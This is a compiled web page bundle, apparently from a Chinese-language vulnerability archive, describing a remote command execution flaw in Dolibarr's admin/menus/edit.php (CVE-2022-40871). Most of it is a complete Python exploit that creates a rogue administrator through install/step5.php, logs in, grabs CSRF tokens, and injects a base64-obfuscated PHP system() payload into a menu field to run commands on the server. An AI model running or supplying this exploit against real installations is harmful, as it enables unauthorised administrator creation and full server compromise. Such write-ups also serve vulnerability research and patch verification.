import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as p}from"./app-58e4a7d6.js";const t={},e=p(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Dolibarr edit.php 存在远程命令执行漏洞，攻击者通过逻辑漏洞创建管理员后可以通过后台漏洞获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Dolibarr &lt;= 15.0.3
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;Dolibarr&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210241018543.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>利用POC 创建用户进行命令执行</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202210241019445.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages <span class="token keyword">import</span> urllib3
<span class="token keyword">import</span> time
<span class="token keyword">import</span> random
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> re


sess <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>
pcre <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r&#39;name=\\&quot;token\\&quot;\\s+value=\\&quot;([^&gt;]+)\\&quot;\\s*[/]*&gt;&#39;</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> <span class="token number">1</span>
    urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>
    resp <span class="token operator">=</span> <span class="token boolean">None</span>
    proxies <span class="token operator">=</span> proxies
    <span class="token keyword">while</span> i <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            resp <span class="token operator">=</span> sess<span class="token punctuation">.</span>request<span class="token punctuation">(</span>method<span class="token operator">=</span>method<span class="token punctuation">,</span> url<span class="token operator">=</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>
                                    data<span class="token operator">=</span>data<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>TooManyRedirects<span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectTimeout<span class="token punctuation">,</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">,</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>Timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">+</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">finally</span><span class="token punctuation">:</span>
            i <span class="token operator">+=</span> <span class="token number">1</span>
    <span class="token keyword">if</span> i <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-]Error retrieve with max retries: {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> resp

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">&#39;Usage: python3 {} http://xxxxx.com/&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">&#39;/&#39;</span><span class="token punctuation">:</span>
        base <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        base <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&#39;User-Agent&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&#39;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    <span class="token comment">#proxies = {&#39;http&#39;: &#39;http://127.0.0.1:8082&#39;, &#39;https&#39;: &#39;http://127.0.0.1:8082&#39;}</span>
    proxies <span class="token operator">=</span> <span class="token boolean">None</span>
    res <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> base<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
    err_flag <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">if</span> res<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Attempt to add admin.&#39;</span><span class="token punctuation">)</span>
        base <span class="token operator">=</span> res<span class="token punctuation">.</span>url<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">&#39;/&#39;</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        add_admin_url <span class="token operator">=</span> <span class="token string">&#39;{}/install/step5.php&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">&#39;action&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;set&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;login&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;testadmins&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;pass&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;testadmins&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;pass_verif&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;testadmins&#39;</span><span class="token punctuation">,</span>
            <span class="token string">&#39;selectlang&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;auto&#39;</span>
        <span class="token punctuation">}</span>
        headers<span class="token punctuation">[</span><span class="token string">&#39;Content-Type&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&#39;application/x-www-form-urlencoded&#39;</span>
        res <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token string">&#39;POST&#39;</span><span class="token punctuation">,</span> add_admin_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
        <span class="token keyword">if</span> res <span class="token keyword">and</span> <span class="token string">&#39;created successfully&#39;</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token string">&#39;exists&#39;</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text <span class="token keyword">and</span> <span class="token string">&#39;Email  already exists&#39;</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
            csrf_token_url <span class="token operator">=</span> <span class="token string">&#39;{}/index.php&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
            res <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> csrf_token_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
            <span class="token keyword">if</span> res<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Attempt to login.&#39;</span><span class="token punctuation">)</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    csrf_token <span class="token operator">=</span> pcre<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
                <span class="token keyword">except</span><span class="token punctuation">:</span>
                    csrf_token <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
                login_url <span class="token operator">=</span> <span class="token string">&#39;{}/index.php?mainmenu=home&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
                headers<span class="token punctuation">[</span><span class="token string">&#39;Referer&#39;</span><span class="token punctuation">]</span> <span class="token operator">=</span> csrf_token_url
                data <span class="token operator">=</span> <span class="token punctuation">{</span>
                    <span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span><span class="token string">&#39;{}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>csrf_token<span class="token punctuation">)</span><span class="token punctuation">,</span>
                    <span class="token string">&#39;actionlogin&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;login&#39;</span><span class="token punctuation">,</span>
                    <span class="token string">&#39;loginfunction&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;loginfunction&#39;</span><span class="token punctuation">,</span>
                    <span class="token string">&#39;username&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;testadmins&#39;</span><span class="token punctuation">,</span>
                    <span class="token string">&#39;password&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;testadmins&#39;</span>
                <span class="token punctuation">}</span>
                res <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token string">&#39;POST&#39;</span><span class="token punctuation">,</span> login_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
                <span class="token keyword">if</span> res <span class="token keyword">and</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">&#39;logout.php&#39;</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Attempt to get csrf token.&#39;</span><span class="token punctuation">)</span>
                    csrf_token_url <span class="token operator">=</span> <span class="token string">&#39;{}/admin/menus/edit.php?menuId=0&amp;action=create&amp;menu_handler=eldy_menu&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
                    res <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> csrf_token_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
                    <span class="token keyword">if</span> res<span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Attemp to inset evil data.&#39;</span><span class="token punctuation">)</span>
                        <span class="token keyword">try</span><span class="token punctuation">:</span>
                            csrf_token <span class="token operator">=</span> pcre<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
                        <span class="token keyword">except</span><span class="token punctuation">:</span>
                            csrf_token <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
                        inset_evil_url <span class="token operator">=</span> <span class="token string">&#39;{}/admin/menus/edit.php&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
                        data <span class="token operator">=</span> <span class="token punctuation">{</span>
                            <span class="token string">&#39;token&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;{}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>csrf_token<span class="token punctuation">)</span><span class="token punctuation">,</span>
                            <span class="token string">&#39;action&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;add&#39;</span><span class="token punctuation">,</span>
                            <span class="token string">&#39;menuId&#39;</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">,</span> <span class="token number">99999</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                            <span class="token string">&#39;menu_handler&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;eldy_menu&#39;</span><span class="token punctuation">,</span>
                            <span class="token string">&#39;user&#39;</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span>
                            <span class="token string">&#39;type&#39;</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
                            <span class="token string">&#39;titre&#39;</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
                            <span class="token string">&#39;url&#39;</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
                            <span class="token string">&#39;enabled&#39;</span><span class="token punctuation">:</span> <span class="token string">&quot;1==1));$d=base64_decode(&#39;ZWNobyAnPCEtLScmJmVjaG8gcHduZWQhISEmJmlkJiZlY2hvJy0tPic=&#39;);$a=base64_decode(&#39;c3lzdGVt&#39;);$a($d);//&quot;</span> <span class="token comment">#execute id command，bypass core/lib/function.lib.php limits</span>
                        <span class="token punctuation">}</span>
                        res <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token string">&#39;POST&#39;</span><span class="token punctuation">,</span> inset_evil_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
                        <span class="token keyword">if</span> res <span class="token keyword">and</span> res<span class="token punctuation">.</span>history<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">:</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[*] Attemp to execute command.&#39;</span><span class="token punctuation">)</span>
                            request<span class="token punctuation">(</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;{}/admin/menus/index.php&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
                            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
                            evil_url <span class="token operator">=</span> <span class="token string">&#39;{}/admin/index.php&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
                            res <span class="token operator">=</span> request<span class="token punctuation">(</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">,</span> evil_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">)</span>
                            <span class="token keyword">if</span> res <span class="token keyword">and</span> res<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">&#39;pwned!!!&#39;</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                                <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
                                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[+] vulnrable! {}&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span>
                                err_flag <span class="token operator">=</span> <span class="token number">0</span>
                    
    <span class="token keyword">if</span> err_flag<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[-] {} is not exploitable.&#39;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,13),o=[e];function c(i,l){return s(),a("div",null,o)}const k=n(t,[["render",c],["__file","Dolibarr edit.php 远程命令执行漏洞 CVE-2022-40871.html.vue"]]);export{k as default};
